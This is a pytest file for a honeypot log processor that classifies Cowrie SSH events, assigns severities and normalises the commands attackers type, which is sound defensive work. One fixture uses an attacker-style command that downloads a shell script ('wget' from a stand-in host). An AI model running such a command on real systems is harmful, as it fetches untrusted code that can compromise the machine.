"""Tests for the SecureTrap Stage 3 Log Processor."""

from core.event_engine.event import AttackEvent
from core.log_processor.processor import LogProcessor


def _make_event(
    event_type: str,
    command: str = "",
) -> AttackEvent:
    return AttackEvent(
        timestamp="2026-08-12T14:20:00.123456Z",
        source_ip="127.0.0.1",
        session_id="session001",
        protocol="ssh",
        command=command,
        event_type=event_type,
        honeypot="Cowrie",
    )


def test_command_input_becomes_command_execution():
    processed = LogProcessor().process(
        _make_event("cowrie.command.input", "pwd")
    )

    assert processed.category == "command_execution"


def test_command_failed_becomes_command_execution():
    processed = LogProcessor().process(
        _make_event("cowrie.command.failed", "nonexistent")
    )

    assert processed.category == "command_execution"


def test_login_success_becomes_authentication():
    processed = LogProcessor().process(
        _make_event("cowrie.login.success")
    )

    assert processed.category == "authentication"


def test_login_failed_becomes_authentication():
    processed = LogProcessor().process(
        _make_event("cowrie.login.failed")
    )

    assert processed.category == "authentication"


def test_session_connect_becomes_session():
    processed = LogProcessor().process(
        _make_event("cowrie.session.connect")
    )

    assert processed.category == "session"


def test_session_closed_becomes_session_termination():
    processed = LogProcessor().process(
        _make_event("cowrie.session.closed")
    )

    assert processed.category == "session_termination"


def test_client_version_becomes_client_activity():
    processed = LogProcessor().process(
        _make_event("cowrie.client.version")
    )

    assert processed.category == "client_activity"


def test_client_kex_becomes_client_activity():
    processed = LogProcessor().process(
        _make_event("cowrie.client.kex")
    )

    assert processed.category == "client_activity"


def test_unknown_event_type_becomes_other():
    processed = LogProcessor().process(
        _make_event("cowrie.some.unmapped.event")
    )

    assert processed.category == "other"


def test_command_whitespace_is_normalized():
    processed = LogProcessor().process(
        _make_event(
            "cowrie.command.input",
            "  wget http://example.com/a.sh  ",
        )
    )

    assert processed.normalized_command == "wget http://example.com/a.sh"


def test_attacker_input_is_not_corrected():
    processed = LogProcessor().process(
        _make_event(
            "cowrie.command.input",
            "  whomai  ",
        )
    )

    assert processed.normalized_command == "whomai"


def test_non_command_event_preserves_empty_command():
    processed = LogProcessor().process(
        _make_event("cowrie.login.success")
    )

    assert processed.normalized_command == ""


def test_severity_values_follow_deterministic_rules():
    cases = {
        "cowrie.login.failed": "medium",
        "cowrie.command.failed": "medium",
        "cowrie.command.input": "low",
        "cowrie.session.connect": "low",
        "cowrie.session.closed": "low",
        "cowrie.client.version": "low",
        "cowrie.client.kex": "low",
        "cowrie.login.success": "low",
        "cowrie.some.unmapped.event": "low",
    }

    processor = LogProcessor()

    for event_type, expected_severity in cases.items():
        processed = processor.process(_make_event(event_type))
        assert processed.severity == expected_severity


def test_original_attack_event_is_preserved():
    event = _make_event(
        "cowrie.command.input",
        "  ls -la  ",
    )

    processed = LogProcessor().process(event)

    assert processed.original_event is event
    assert processed.original_event.timestamp == (
        "2026-08-12T14:20:00.123456Z"
    )
    assert processed.original_event.source_ip == "127.0.0.1"
    assert processed.original_event.session_id == "session001"
    assert processed.original_event.protocol == "ssh"
    assert processed.original_event.command == "  ls -la  "
    assert processed.original_event.event_type == "cowrie.command.input"
    assert processed.original_event.honeypot == "Cowrie"